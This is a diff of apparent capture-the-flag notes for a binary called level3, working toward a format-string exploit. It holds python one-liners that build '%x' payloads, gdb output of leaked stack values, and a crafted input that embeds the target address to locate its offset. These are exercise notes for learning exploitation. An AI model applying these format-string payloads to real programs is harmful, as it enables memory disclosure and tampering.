@@ -92,7 +92,7 @@ gs             0x33	51
 Now we need to understand how to write that number into m
 
 
-python -c 'print "%x "*512' > /tmp/payload
+python -c 'print "%x "*512' > /tmp/payload // replace %x by %p just give the same result with 0x prefix
 
 (gdb) r < /tmp/payload
 Starting program: /home/user/level3/level3 < /tmp/payload
@@ -128,4 +128,7 @@ b7ff26b0 b7e453e9 b7ffeff4 1 80483f0 0
 [Inferior 1 (process 2650) exited normally]
 
 Should be possible out of those addr to calculate "padding" to find m
+
+python -c 'print "AAAAAAAAAAAAAAAAAAAAAA" + "\x8c\x98\x04\x08" + "bbbbbbbbb"  + "%x "*512' | ./level3
+988c4141 --> this value appears in the middle of the A and b
 
